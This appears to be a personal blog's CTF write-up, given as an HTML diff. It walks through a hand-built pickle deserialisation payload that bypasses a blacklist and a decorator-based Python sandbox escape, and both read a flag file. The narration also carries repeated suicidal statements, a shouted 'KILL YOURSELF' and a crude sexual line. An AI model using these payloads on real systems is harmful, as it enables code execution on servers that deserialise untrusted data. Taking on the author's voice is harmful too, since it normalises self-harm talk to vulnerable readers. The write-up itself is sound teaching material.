@@ -1,0 +1,744 @@
+<html lang="en">
+  <head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <title>wrenches.online</title>
+    <link rel="stylesheet" href="style.css">
+    <link rel="stylesheet" href="https://unpkg.com/@highlightjs/cdn-assets@11.9.0/styles/base16/gruvbox-dark-soft.min.css">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+  </head>
+  <body class="bg-stone-900 text-stone-300">
+    <script src="https://cdn.tailwindcss.com"></script>
+
+    <main class="relative mx-auto w-4/5 mt-10 text-xl mb-[75px]">
+        <div class="my-3 text-3xl font-bold text-orange-200 header">wrenches.online</div>
+        <hr class="my-10">
+        <div class="header my-3 text-2xl font-bold">ist es over für mich </div>
+        <div class="my-3 text-1xl">
+            tw i talk abt killing myself a lot in this writeup for some reason<br>
+            <img src="images/akito-toya.gif">
+            i played sieberrsec quals + finals w some friends heres sum writeups for da fun ctf. im apparently a pyjail main now despite not really knowing shit about pyjails, and i did mainly focus on those challenges during the event proper. this challenge is actually mainly just an excuse to write about pickle bytecode which i have, for some reason, been very enamored with as of late.<br><br> my song for the day is <a href="'https://www.youtube.com/watch?v=dSw8CucthGc">meltdown by irohasasaki</a>. i like this song because its about killing yourself and i have been wanting to do that a lot as of late. here is my friend az 'azazo' azo's <a href="'https://azazazo.github.io/posts/sieberr25/">writeups</a> they are very cool and smart and funny and you should read the ill works of their genius mind
+        </div>
+
+        <img src="images/thankyouazazo.png">
+        <br>
+
+        <div class="header my-3 text-2xl font-bold">wubbalubbadubdub</div>
+
+        <div class="my-3 text-1xl">k so this is technically marked as web but its rlly not. its a pickle challenge, where the webserver deserializes any arbitrary pickle file you give to it. there is a (trivially bypassable) blacklist. when i saw this challenge i quickly realised what it was about and very quickly decided i would try my best to get first blood, and if i didnt, i would shoot myself in the head. luckily i managed to blood it so im still alive for now.</div>
+
+        <img src="images/blooding.png">
+
+        <div class="my-3 text-1xl"></div>
+        <pre><code class="language-python">
+import pickle
+import io
+
+blacklist = ["eval", "exec", "compile", "import", "os", "sys",
+"subprocess", "open", "read", "system", "cat", "flag"]
+
+bruh = """[the rick and morty copypasta excised for brevity]"""
+    
+def loads(data):
+    try:
+        for banned in blacklist:
+            assert banned.encode() not in data
+
+        obj = str(pickle.Unpickler(io.BytesIO(data)).load())
+
+        assert 'sctf' not in obj
+
+        return obj
+    except:
+        return bruh
+        </code></pre>
+
+        <div class="my-3 text-1xl">
+            so we need to submit any pickle that bypasses the blacklist. first things first what the fuck is a pickle? a pickle is just bytecode that builds arbitrary python objects. you might be familiar with the classic:
+        </div>
+
+        <pre><code>
+class P(object):
+    def __reduce__(self):
+        return (os.system,("bash -c 'touch /tmp/pwned'""))
+        </code></pre>
+
+        <div class="my-3">(above taken from the very smart <a href='https://fern89.github.io/posts/whoogle-rce/'>fern's blog</a>) because i know them personally and i couldnt find another boilerplate pickle payload<br><br>
+        
+        kk so anyways thats like the standard, right, but i personally dont like this way of understanding pickles because it doesnt actually teach you what you can and cant do w/ them. like, why does the parameter passed to <span class=font-mono>__reduce__</span> have to be a tuple? why do we have to make a class object? what the fuck is <span class=font-mono>__reduce__</span>? why are we here? just to suffer?</div>
+
+        <div class="my-3">so lets start from the beginning. pickles are just bytecode. meaning, we can write our own, right? if we just learn what all the bytecode instructions do. theres a lot of good resources for this <a href='https://github.com/python/cpython/blob/3.10/Lib/pickle.py#L1322C1-L1348C44'>like</a> <a href='https://chengchingwen.github.io/Pickle.jl/dev/opcode/'>these</a> <a href='https://github.com/chengchingwen/Pickle.jl/blob/8137c7d07c45024050ece264babc3c334f9efd1f/src/opcode/opcode_desc.jl#L117-L123'>ones</a> but those are kind of annoying and boring so lets just cut right to the fat. the way pickle builds and serialises python objects is by calling functions and methods to create the objects in the first place. this means that we can somehow use pickle bytecode to call functions. if we can write our pickle bytecode, we can therefore call our own functions and methods, and potentially write something like <span class=font-mono>open('flag.txt')</span>. how would we go about doing that?</div>
+
+        <div class="my-3">time to introduce a few keywords: <span class='font-mono'>GLOBAL</span>. this is represented as a <span class=font-mono>c</span> in bytecode, and its followed by 2 newline terminated strings <span class=font-mono>module, class</span>. when we call <span class=font-mono></span>it puts our class object on the stack (typically, a function), and we can then push more objects onto the stack as arguments, and then call it with the opcode <span class=font-mono>REDUCE</span>.</div>
+
+        <pre><code class="language-python">
+>>> payload = GLOBAL + b'builtins\nopen\n' + STOP
+>>> pickletools.dis(payload)
+    0: c    GLOBAL     'builtins open'
+   19: .    STOP
+highest protocol among opcodes = 0
+        </code></pre>
+
+        <div class="my-3">
+          we're gonna be making heavy use of <span class=font-mono>pickletools</span> here because it shows us a nice picture of what is going on. we can see our <span class=font-mono>open</span> function initialised, and if we want to read <span class=font-mono>flag.txt</span> theres three steps. first, we push a string with the <span class=font-mono>UNICODE</span> instruction:
+        </div>
+
+        <pre><code class="language-python">
+>>> payload = GLOBAL + b'builtins\nopen\n' + UNICODE + b'flag.txt\n' + STOP
+>>> pickletools.dis(payload)
+    0: c    GLOBAL     'builtins open'
+   19: V    UNICODE    'flag.txt'
+   29: .    STOP
+        </code></pre>
+
+        <div class=my-3>then, we have to put all our arguments to the function (in this case, just one) - to the tuple. we do this by passing in <span class=font-mono>TUPLE1</span>, which takes the item from the top of the stack and wraps it in a tuple. note also <span class=font-mono>TUPLE2, TUPLE3</span> and just <span class=font-mono>TUPLE</span>, which all do similar things.</div>
+
+        <pre><code class="language-python">
+>>> payload = GLOBAL + b'builtins\nopen\n' + UNICODE + b'flag.txt\n' + TUPLE1 + STOP
+>>> pickletools.dis(payload)
+    0: c    GLOBAL     'builtins open'
+   19: V    UNICODE    'flag.txt'
+   29: \x85 TUPLE1
+   30: .    STOP
+        </code></pre>
+        
+        <div class=my-3>the final step is to just call <span class=font-mono>REDUCE</span>, which calls the topmost function from the stack on its corresponding args, and then returns the output of that function.</div>
+
+        <pre><code class="language-python">
+>>> payload = GLOBAL + b'builtins\nopen\n' + UNICODE + b'flag.txt\n' + TUPLE1 + REDUCE + STOP
+>>> pickletools.dis(payload)
+    0: c    GLOBAL     'builtins open'
+   19: V    UNICODE    'flag.txt'
+   29: \x85 TUPLE1
+   30: R    REDUCE
+   31: .    STOP
+highest protocol among opcodes = 2
+        </code></pre>
+
+        <div class="my-3">if we try <span class=font-mono>load()</span>ing our payload, we get:</div>
+
+        <pre><code class="language-python">
+>>> payload = GLOBAL + b'builtins\nopen\n' + UNICODE + b'flag.txt\n' + TUPLE1 + REDUCE + STOP
+>>> z = loads(payload)
+>>> z
+<_io.TextIOWrapper name='flag.txt' mode='r' encoding='UTF-8'>
+        </code></pre>
+
+        <div class="my-3">cool! note that we don't actually get the text because it's a file object. the way we get file objects is we need to access the <span class=font-mono>read()</span> method of our specific file object - methods are, in our use-case, essentially just functions localised to a certain object, so they don't need any parameters. i think even if you're very familiar with python as a scripting language, the intricacies of such minute details are very tricky to wrap your head around (because for all intents and purposes it doesnt really matter because youre never gonna need to do this shit so low-level) so acclimatising yourself with pickle bytecode, doing it all by hand, it's really very satisfying.</div>
+
+        <div class="my-3">typically we are able to access attributes like methods by using the following notation: <span class=font-mono>class.attribute</span>. simple! but pickle offers us no such luxury. when you look under the hood, all that <span class=font-mono>class.attribute</span> is really <i>doing</i> is just calling a function called <span class=font-mono>getattr(class, 'attribute')</span>. the first argument being the class object, and the second being the string representation of the object. this is pretty important actually, but we'll get to that later. we want to get the <span class=font-mono>read()</span> attribute, so first we need to grab <span class=font-mono>getattr()</span>.</div>
+
+        <pre><code class="language-python">
+>>> payload = GLOBAL + b'builtins\ngetattr\n'
+>>> payload += GLOBAL + b'builtins\nopen\n' + UNICODE + b'flag.txt\n' + TUPLE1 + REDUCE
+>>> payload += UNICODE + b'read\n' + TUPLE2 + REDUCE
+>>> payload += STOP
+>>> pickletools.dis(payload)
+    0: c    GLOBAL     'builtins getattr'
+   18: c    GLOBAL     'builtins open'
+   33: V    UNICODE    'flag.txt'
+   43: \x85 TUPLE1
+   44: R    REDUCE
+   45: V    UNICODE    'read'
+   51: \x86 TUPLE2
+   52: R    REDUCE
+   53: .    STOP
+highest protocol among opcodes = 2
+        </code></pre>
+
+        <div class="my-3">ok this has rapidly gotten quite unwieldy, but thats ok. because pickles are, at their heart, stack machines, we need to do this weird nesting nonsense to make sure we get what we want. essentially, this codeblock translates to:</div>
+        
+        <pre><code class=language-python>
+__import__('builtins').getattr(
+  __import__('builtins').open('flag'.txt),
+  'read'
+)
+        </code></pre>
+
+        <div class="my-3">what we're left with is the 'read' method, which we can just call with no args (an empty tuple). and then..</div>
+
+        <pre><code class="language-python">
+>>> payload = GLOBAL + b'builtins\ngetattr\n'
+>>> payload += GLOBAL + b'builtins\nopen\n' + UNICODE + b'flag.txt\n' + TUPLE1 + REDUCE
+>>> payload += UNICODE + b'read\n' + TUPLE2 + REDUCE
+>>> payload += EMPTY_TUPLE + REDUCE
+>>> payload += STOP
+>>> pickletools.dis(payload)
+    0: c    GLOBAL     'builtins getattr'
+   18: c    GLOBAL     'builtins open'
+   33: V    UNICODE    'flag.txt'
+   43: \x85 TUPLE1
+   44: R    REDUCE
+   45: V    UNICODE    'read'
+   51: \x86 TUPLE2
+   52: R    REDUCE
+   53: )    EMPTY_TUPLE
+   54: R    REDUCE
+   55: .    STOP
+highest protocol among opcodes = 2
+>>> z = loads(payload)
+>>> z
+'wrenchesonline{imgonnakillmyself}\n'
+        </code></pre>
+
+        <div class="my-3">translating this once more into python would look like:</div>
+
+        <pre><code class=language-python>
+__import__('builtins').getattr(
+  __import__('builtins').open('flag'.txt),
+  'read'
+)()
+        </code></pre>
+
+        <div class="my-3">note the empty tuple at the end corresponding to the function call. anyways, we're done, right? we can just pass our pickle into the challenge and get our flag?<br><br>unfortunately, we're stopped by the blacklist: <span class=font-mono>open</span>, <span class=font-mono>flag</span>, and other similar strings are filtered by the blacklist. note that in a standard non-pickle-pyjail there's ways to bypass this, of course: you can just do <span class=font-mono>'fl'+'ag'</span>, or something like that. our problem arises with the fact that <span class=font-mono>GLOBAL</span>opcode doesn't allow us to do anything of this sort. our <span class=font-mono>open</span> function has to diedie be 'open' if we're using <span class=font-mono>GLOBAL</span>. cannot anyhow dogshit.<br><br>in order to think about how to construct our pickle, its best if we first write our payload in (increasingly contrived) python, and then translate it into bytecode. let's start with the following:</div>
+
+        <pre><code class="language-python">
+__import__('builtins').getattr(
+  __import__('builtins').open('flag'.txt),
+  'read'
+)()
+        </code></pre>
+
+        <div class="my-3">our issue here is 'flag' and 'open'. we can get past 'flag' by doing something like this:</div>
+      
+        <pre><code class="language-python">
+__import__('builtins').getattr(
+  __import__('builtins').open('fl'+'ag.txt'),
+  'read'
+)()
+        </code></pre>
+
+        <div class="my-3">but to actually do string addition in pickle bytecode, there are some caveats we need to consider. first, when two strings are added in python, all it's really doing is calling the <span class=font-mono>__add__</span> method. so we'll need to <span class=font-mono>getattr()</span> that method after we initialise a string <span class=font-mono>'fl'</span> and then call that method on our remaining string <span class=font-mono>'ag.txt'</span>. this complicates things a bit.</div>
+
+<pre><code class="language-python">
+__import__('builtins').getattr(
+  __import__('builtins').open(
+      __import__('builtins').getattr(
+        'fl', '__add__'
+      )('ag.txt')
+      ),
+    'read'
+)()
+        </code></pre>
+
+        <div class="my-3">ok if you have begun to lose the plot thats ok this is kind of the Point of No Return. all that was once chill must one day kena. its really not gonna get any easier from here so please just try ur best ah dont playplay.<br><br>
+        bypassing the <span class=font-mono>open</span> constraint is remarkably trickier. remember that we cant pass in arbitrary parameters to <span class=font-mono>GLOBAL</span>, they must be the strings as-is. but keep in mind that if we are able to access the <span class=font-mono>builtins</span> module as is, we can just do something like <span class=font-mono>getattr(builtins, 'op'+'en')</span>and we'll have our function. but how do we get builtins as a module?</div>
+        
+        <pre><code class="language-python">
+>>> dir(print)
+[..., '__self__', '__setattr__', '__sizeof__', '__str__', '__subclasshook__', ...]
+>>> print.__self__
+&lt;module 'builtins' (built-in)&gt;
+        </code></pre>
+        
+        <div class="my-3">a sneaky little pyjail trick: every builtins function has a <span class=font-mono>__self__</span> attribute that points back to the builtins module itself. so, we can just grab any function <span class=font-mono>GLOBAL</span>, then pass that in as an arg to a <span class=font-mono>getattr()</span> call, and voila. simple, obviously! our code to retrieve <span class="font-mono">open()</span> will now look something like this:</div>
+
+        <pre><code class="language-python">
+__import__('builtins').getattr (
+  __import__('builtins').getattr
+    (
+      __import__(builtins, 'print'),
+      '__self__'
+    ),
+  'open'
+)
+        </code></pre>
+
+        <div class="my-3">kena. keep in mind we still need to do the <span class=font-mono>__add__</span> trick to bypass the blacklist so this actually looks more like:</div>
+
+        <pre><code class=language-python>
+__import__('builtins').getattr (
+  __import__('builtins').getattr
+    (
+      __import__(builtins, 'print'),
+      '__self__'
+    ),
+  __import__('builtins').getattr(
+    'op', '__add__'
+  )('en')
+)
+        </code></pre>
+
+        <div class="my-3">ok awesome now all we have to do is combine the first part with the bottom part, which is a painful, masochistic exercise that takes a lot of care and patience to get right. in all honesty this is probably why i like pyjails so much its really just a healthier substitute for self-harm. anyways time to assemble our final fucking python-payload:</div>
+
+        <pre><code class="language-python">
+>>> __import__('builtins').getattr (
+...   __import__('builtins').getattr (
+...     __import__('builtins').getattr
+...       (
+...         __import__('builtins').print,
+...         '__self__'
+...       ),
+...     __import__('builtins').getattr(
+...       'op', '__add__'
+...     )('en')
+...   )(
+...     __import__('builtins').getattr(
+...       'fl', '__add__'
+...     )('ag.txt')
+...   ),
+...   'read'
+... )()
+'wrenchesonline{imgonnakillmyself}\n'
+        </code></pre>
+
+        <div class="my-3">go go go go head so good she honor roll she ride the dick like a carnival</div>
+
+        <img src="images/cooltext487514785309795.gif">
+
+        <div class="my-3">now we just gotta turn this into a fucking pickle payload i guess. after being really invested in learning this shit for about 50 total hours across 3 weeks you kind of entr a pickling flowstate which i imagine is not dissimilar to how pwnsters get when they fsop the house of einherjar into the rce ret2dlresolve (i dont do pwn can you tell) but you know let's just lock in and crank this shit out lets crank these fucking 90s twin</div>
+
+        <pre><code class=language-python>
+payload = GLOBAL + b'builtins\ngetattr\n'
+payload += GLOBAL + b'builtins\ngetattr\n'
+payload += GLOBAL + b'builtins\ngetattr\n'
+payload += GLOBAL + b'builtins\nprint\n'
+payload += UNICODE + b'__self__\n' + TUPLE2 + REDUCE
+payload += GLOBAL + b'builtins\ngetattr\n'
+payload += UNICODE + b'op\n' + UNICODE + b'__add__\n'
+payload += TUPLE2 + REDUCE
+payload += UNICODE + b'en\n' + TUPLE1 + REDUCE
+payload += TUPLE2 + REDUCE
+payload += GLOBAL + b'builtins\ngetattr\n'
+payload += UNICODE + b'fl\n' + UNICODE + b'__add__\n'
+payload += TUPLE2 + REDUCE
+payload += UNICODE + b'ag.txt\n' + TUPLE1 + REDUCE
+payload += TUPLE1 + REDUCE
+payload += UNICODE + b'read\n' + TUPLE2 + REDUCE
+payload += EMPTY_TUPLE + REDUCE
+payload += STOP
+        </code></pre>
+
+        <div class="my-3">statements dreamed up by the utterly deranged. anyways this fucking works lol</div>
+        
+        <pre><code class="font-mono">
+>>> pickletools.dis(payload)
+    0: c    GLOBAL     'builtins getattr'
+   18: c    GLOBAL     'builtins getattr'
+   36: c    GLOBAL     'builtins getattr'
+   54: c    GLOBAL     'builtins print'
+   70: V    UNICODE    '__self__'
+   80: \x86 TUPLE2
+   81: R    REDUCE
+   82: c    GLOBAL     'builtins getattr'
+  100: V    UNICODE    'op'
+  104: V    UNICODE    '__add__'
+  113: \x86 TUPLE2
+  114: R    REDUCE
+  115: V    UNICODE    'en'
+  119: \x85 TUPLE1
+  120: R    REDUCE
+  121: \x86 TUPLE2
+  122: R    REDUCE
+  123: c    GLOBAL     'builtins getattr'
+  141: V    UNICODE    'fl'
+  145: V    UNICODE    '__add__'
+  154: \x86 TUPLE2
+  155: R    REDUCE
+  156: V    UNICODE    'ag.txt'
+  164: \x85 TUPLE1
+  165: R    REDUCE
+  166: \x85 TUPLE1
+  167: R    REDUCE
+  168: V    UNICODE    'read'
+  174: \x86 TUPLE2
+  175: R    REDUCE
+  176: )    EMPTY_TUPLE
+  177: R    REDUCE
+  178: .    STOP
+highest protocol among opcodes = 2
+>>> loads(payload)
+'wrenchesonline{imgonnakillmyself}\n'
+>>>
+        </code></pre>
+
+        <div class="my-3">uhh so this doesnt actually work yet if we pass it into the challenge itself because of the final check here:</div>
+
+        <pre><code class=language-python>
+assert 'sctf' not in obj
+        </code></pre>
+
+        <div class="my-3">so it just checks if the flag prefix is there. we can typically just do string slicing but that's really annoying to do in pickles (we'd need to call a bunch of methods or whatever nonsense). during the ctf itself i just ran <span class=font-mono>dir(str)</span> and saw the <span class=font-mono>removeprefix</span> method, which, well, removes prefixes. so, BACK TO GETATTR HELL:</div>
+
+        <pre><code class=language-python>
+payload = GLOBAL + b'builtins\ngetattr\n'
+payload += GLOBAL + b'builtins\ngetattr\n'
+payload += GLOBAL + b'builtins\ngetattr\n'
+payload += GLOBAL + b'builtins\ngetattr\n'
+payload += GLOBAL + b'builtins\nprint\n'
+payload += UNICODE + b'__self__\n' + TUPLE2 + REDUCE
+payload += GLOBAL + b'builtins\ngetattr\n'
+payload += UNICODE + b'op\n' + UNICODE + b'__add__\n'
+payload += TUPLE2 + REDUCE
+payload += UNICODE + b'en\n' + TUPLE1 + REDUCE
+payload += TUPLE2 + REDUCE
+payload += GLOBAL + b'builtins\ngetattr\n'
+payload += UNICODE + b'fl\n' + UNICODE + b'__add__\n'
+payload += TUPLE2 + REDUCE
+payload += UNICODE + b'ag.txt\n' + TUPLE1 + REDUCE
+payload += TUPLE1 + REDUCE
+payload += UNICODE + b'read\n' + TUPLE2 + REDUCE
+payload += EMPTY_TUPLE + REDUCE
+payload += UNICODE + b'removeprefix\n' + TUPLE2 + REDUCE
+payload += UNICODE + b's\n' + TUPLE1 + REDUCE
+payload += STOP
+
+>>> payload
+b'cbuiltins\ngetattr\ncbuiltins\ngetattr\ncbuiltins\ngetattr\ncbuiltins\ngetattr\ncbuiltins\nprint\nV__self__\n\x86Rcbuiltins\ngetattr\nVop\nV__add__\n\x86RVen\n\x85R\x86Rcbuiltins\ngetattr\nVfl\nV__add__\n\x86RVag.txt\n\x85R\x85RVread\n\x86R)RVremoveprefix\n\x86RVw\n\x85R.'
+
+        </code></pre>
+
+        <div class="my-3">we can actually see what the pickle looks like there. note that each instruction is just a single byte, and how 'flag' or 'open' never exist as contiguous sections within the bytestring so we pass the blacklist. anyways, saving this to a file and passing it to our challenge:</div>
+
+        <img src="images/chungus.png">
+
+        <div class="my-3">wait. FUCK my life man. i forgot <span class=font-mono>read</span> was in the fucking blacklist now i have to write all this shit over again its 3AM FUUUCK (i shouted out loud when i realised this and then my dad went to ask me if i was ok)</div>
+
+        <pre><code class=language-python>
+payload = GLOBAL + b'builtins\ngetattr\n'
+payload += GLOBAL + b'builtins\ngetattr\n'
+payload += GLOBAL + b'builtins\ngetattr\n'
+payload += GLOBAL + b'builtins\ngetattr\n'
+payload += GLOBAL + b'builtins\nprint\n'
+payload += UNICODE + b'__self__\n' + TUPLE2 + REDUCE
+payload += GLOBAL + b'builtins\ngetattr\n'
+payload += UNICODE + b'op\n' + UNICODE + b'__add__\n'
+payload += TUPLE2 + REDUCE
+payload += UNICODE + b'en\n' + TUPLE1 + REDUCE
+payload += TUPLE2 + REDUCE
+payload += GLOBAL + b'builtins\ngetattr\n'
+payload += UNICODE + b'fl\n' + UNICODE + b'__add__\n'
+payload += TUPLE2 + REDUCE
+payload += UNICODE + b'ag.txt\n' + TUPLE1 + REDUCE
+payload += TUPLE1 + REDUCE
+payload += GLOBAL + b'builtins\ngetattr\n'
+payload += UNICODE + b're\n' + UNICODE + b'__add__\n'
+payload += TUPLE2 + REDUCE
+payload += UNICODE + b'ad\n' + TUPLE1 + REDUCE
+payload += TUPLE2 + REDUCE
+payload += EMPTY_TUPLE + REDUCE
+payload += UNICODE + b'removeprefix\n' + TUPLE2 + REDUCE
+payload += UNICODE + b's\n' + TUPLE1 + REDUCE
+payload += STOP
+        </code></pre>
+
+        <img src="images/solveddd.png">
+
+        <div class="my-3">a few things:<br><br>this was probably gpt-oneshottable. i dont care. let me have my wins.<br><br>yes, <a href='github.com/splitline/Pickora'>pickora</a> exists. i am above using that shit (i have staked an insane amount of selfworth onto this stupid skill that i have and the fact that a tool has made me obsolete is one i am unwilling to grapple with).<br><br></div>
+
+        <img src="images/type shi im on.png">
+
+        <div class="header my-3 text-2xl font-bold">minivim</div>
+
+        <div class="my-3">just took one of my antidepressants lets hope this shit ggives me superpowers i gotta finish this writeup before 5am and sleep anyways i was the only solve for this pyjail in finals. to be honest i am really very stupid and did not deserve the solve (im really just very bad at this jail nonsense truly)</div>
+
+        <pre><code class=language-python>
+characters = ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', '!', '"', '#', '$', '%', '&', "'", '*', '+', ',', '-', '/', ':', ';', '<', '>', '?', '@', '\\', '^', '_', '`', '|', '~', ' ', '\t', '\n']
+
+premium_stuff = ["async", "await", "yield", "assert", "eval", "exec", "compile", "input", "import", "breakpoint", "help", "locals", "globals", "builtins", "exit", "print", "bool", "bytearray", "bytes", "classmethod", "complex", "dict", "enumerate", "filter", 
+"float", "frozenset", "int", "list", "map", "memoryview", "object", "property", "range", "reversed", "set", "slice", "staticmethod", "str", "super", "tuple", "type", "zip"]
+
+class MiniVim:
+    def __init__(self):
+        self.padding = 40
+        self.code = ""
+
+    def start(self):
+        while True:
+            self.display_menu()
+            choice = input("Select an option: ")
+
+            if choice == "1":
+                self.display_code()
+            elif choice == "2":
+                self.editor()
+            elif choice == "3":
+                self.clear_code()
+            elif choice == "4":
+                self.run_code()
+            elif choice == "5":
+                self.about()
+            elif choice == "6":
+                print("Exiting...")
+                exit()
+
+    def clear(self):
+        import os
+        os.system('clear')
+
+    def pause(self):
+        input("Press Enter to return to menu...")
+
+    def banner(self, lines):
+        print("=" * self.padding)
+        
+        for line in lines:
+            print(line.center(self.padding))
+
+        print("=" * self.padding)
+
+    def display_menu(self):
+        self.clear()
+        self.banner(["MiniVim 1.0"])
+
+        print("1. Inspect code file")
+        print("2. Edit code file")
+        print("3. Clear code file")
+        print("4. Execute code file")
+        print("5. About")
+        print("6. Exit")
+        print("=" * self.padding)
+
+    def about(self):
+        self.clear()
+        self.banner(["MiniVim 1.0", "A lightweight text-based Python IDE", "By jeff160"])
+
+        self.pause()
+
+    def display_code(self):
+        self.clear()
+        self.banner(["Your Code"])
+        print(self.code)
+
+        self.pause()
+
+    def clear_code(self):
+        self.clear()
+        self.banner(["Code file emptied"])
+        
+        self.code = ""
+        self.pause()
+
+    def run_code(self):
+        self.clear()
+        self.banner(["Execution Results"])
+
+        try:
+            import time
+            start_time = time.time()
+
+            exec(self.code, {})
+
+            end_time = time.time()
+
+            print(f"\nFinished execution in {round((end_time - start_time) * 1000, 7)}ms")
+        except Exception as e:
+            print(f"Error: {e}")
+
+        self.pause()
+
+    def editor(self):
+        self.clear()
+        self.banner(["Enter Python code line by line", "Empty line to finish"])
+
+        while True:
+            try:
+                line = input("> ")
+
+                if not len(line):
+                    break
+
+                for char in line:
+                    assert char in characters, "Invalid character!"
+
+                for stuff in premium_stuff:
+                    assert stuff not in line, "You don't have access to this feature! Premium subscription coming soon!"
+
+                self.code += line + "\n"
+
+            except Exception as e:
+                print(e)
+
+if __name__ == "__main__":
+    ide = MiniVim()
+    ide.clear()
+    ide.start()
+        </code></pre>
+
+        <div class="my-3">ok summary: multiline input (!), extremely restrictive character whitelist (no brackets, square-brackets), and a bunch of other shit. i spin my wheels on this for a little while trying to figure out how the hell to get function calls with no <span class=font-mono>()</span>. no variable assignment either because we would need either <span class=font-mono>setstate()</span> or <span class=font-mono>setattr()</span> or like <span class=font-mono>=</span>, literally just the equals sign we dont have. man im like really depressed like seriously not even a joke i wish i wasnt really alive i dont particularly feel alive anyway</div>
+
+        <div class="my-3">ok anyways eventually i look through the <a href='https://shirajuki.js.org/blog/pyjail-cheatsheet/'>pyjail holy grail</a>.when you have a character whitelist its a lot more interesting to see what you <i>can</i> do and not what you can't do, and the interesting thing we have here is <span class=font-mono>@</span> - coupled w/ the fact we have multiline inputs, we can use decorators.</div>
+
+        <div class="my-3">i havent felt real joy for weeks</div>
+
+        <img src="images/trvth.png">
+
+        <div class="my-3">so decorators are kind of semi-obscure python nonsense. its essentially, syntactic sugar, stupid function-related shorthand for functions that operate on other functions. ive never hadto use these outside of Flask because ive never written anything that necessitated second order functions but:</div>
+
+        <pre><code class=language-python>
+def g(func):
+  return print
+
+def f(a, b, c):
+  return a, b, c
+
+@g
+def x(a, b, c):
+  return a, b, c
+        </code></pre>
+
+        <div class="my-3">
+          in the above code snippet, <span class="font-mono">x(a, b, c)</span> does the same shit as <span class=font-mono>g(f(a, b, c))</span>. what this means for our purposes is we can do something like this:
+        </div>
+
+        <pre><code class="language-python">
+>>> def x(y): return 72
+
+>>> @print
+... @chr
+... @x
+... def a(): pass
+... 
+H
+        </code></pre>
+
+        <div class="my-3">so that might seem pretty fucking weird but really all we're doing here is <span class=font-mono>print(chr(72))</span>. the problem here is we still got those fucking nasty ass <span class=font-mono>(</span>s, but there are ways to get rid of them. note that they appear in two places: in our initial function definition of <span class=font-mono>x()</span>, and the 'fodder' for <span class=font-mono>a()</span>. we'll address those one by one.</div>
+
+        <pre><code class=language-python>
+>>> @print
+... @chr
+... @x
+... class a: pass
+... 
+H
+        </code></pre>
+
+        <div class="my-3">
+          so, decorators can also work on classes, and we do not need brackets for class definitions. epic. now:
+        </div>
+
+        <pre><code class=language-python>
+>>> @print
+... @chr
+... @lambda x: 72
+... class a: pass
+... 
+H
+        </code></pre>
+
+        <div class="my-3">
+          so in newer python versions you can actually use lambda funcs as decorators which makes our job way easier. anyways so yeah those are our function execution primitives, and now we need to figure out how to use these primitives to execute <span class="font-mono">open('flag.txt').read()</span>. keep in mind <span class=font-mono>read</span> is actually blacklisted, and even if it wasn't, we don't really have a good way to get methods like that. we also need to get a <span class=font-mono>.</span> somehow. 
+        </div>
+
+        <pre><code class=language-python>
+>>> @print
+... @chr
+... @lambda x: 46
+... class a: pass
+... 
+.
+        </code></pre>
+
+        <div class="my-3">so we're able to get <span class=font-mono>.</span> by way of <span class=font-mono>chr(46)</span>, but we still need to somehow concatenate this with <span class=font-mono>flag</span>. we can do this with, once again, more lambda functions.</div>
+
+        <pre><code class=language-python>
+>>> @print
+... @lambda x: 'flag' + x + 'txt'
+... @chr
+... @lambda x: 46
+... class a: pass
+... 
+flag.txt
+        </code></pre>
+
+        <div class="my-3">now keep in mind decorators are strictly single-argument only. so we can't do funky shit like <span class=font-mono>getattr()</span> bc that is strictly two-args. anyways we need to figure out how to get <span class=font-mono>.read()</span>, i spent a long while trying to figure this out but the answer is you just like, can't get that method at all, i'm pretty sure. i tried!</div>
+
+        <pre><code class="language-python">
+>>> @print
+... @lambda x: x.read
+... @open
+... @lambda x: 'flag'+x+'txt'
+... @chr
+... @lambda x: 46
+... class a: pass
+... 
+&lt;built-in method read of _io.TextIOWrapper object at 0x7f6c8962e0a0>
+        </code></pre>
+
+        <div class="my-3">this doesnt work because we don't have <span class=font-mono>.</span>. im pretty sure there must be some builtin that implicitly calls its single-arg func passed in but idgaf im fucking too tired to think about that shit. anyways the trick is theres builtins that are able to do the same thing that <span class=font-mono>read()</span> does, like, for some reason, <span class=font-mono>next()</span>.</div>
+
+        <pre><code class=language-python>
+>>> @print
+... @next
+... @open
+... @lambda x: 'flag'+x+'txt'
+... @chr
+... @lambda x: 46
+... class a: pass
+... 
+sctf{iamgoingtoselfimmolateinfrontofNUSCOM1}
+        </code></pre>
+
+        <div class="my-3">ok well then this just works, right? this is our solve? no! KILL YOURSELF. <span class=font-mono>print()</span> is blacklisted. i thought long and hard about how to get ou flag printed out, theres 'hacks' like using <span class=font-mono>int()</span> and getting the flag printed to stderr:</div>
+
+        <pre><code class=language-python>
+>>> @int
+... @next
+... @open
+... @lambda x: 'flag'+x+'txt'
+... @chr
+... @lambda x: 46
+... class a: pass
+... 
+Traceback (most recent call last):
+  File "<python-input-25>", line 1, in <module>
+    @int
+     ^^^
+ValueError: invalid literal for int() with base 10: 'sctf{iamgoingtoselfimmolateinfrontofNUSCOM1}\n'
+        </code></pre>
+
+        <div class="my-3">but ofc all types we can use are blacklisted as well. but this led me down the right idea, which is manipulating stderr. we can actually create an Exception.</div>
+
+        <pre><code class=language-python>
+>>> e = Exception('im going to kill myself')
+>>> raise e
+Traceback (most recent call last):
+  File "<python-input-28>", line 1, in <module>
+    raise e
+Exception: im going to kill myself
+        </code></pre>
+
+        <div class="my-3">an Exception is also just a type that takes in a single arg. so, what we do is create an Exception with our flag string, and then raise it. and thats how we get our flag.</div>
+
+        <pre><code class=language-python>
+>>> @Exception
+... @next
+... @open
+... @lambda x: 'flag'+x+'txt'
+... @chr
+... @lambda x: 46
+... class a: pass
+... 
+>>> raise a
+Traceback (most recent call last):
+  File "<python-input-30>", line 1, in <module>
+    raise a
+Exception: sctf{iamgoingtoselfimmolateinfrontofNUSCOM1}
+        </code></pre>
+
+        <img src="images/picsthatgohard.gif">
+
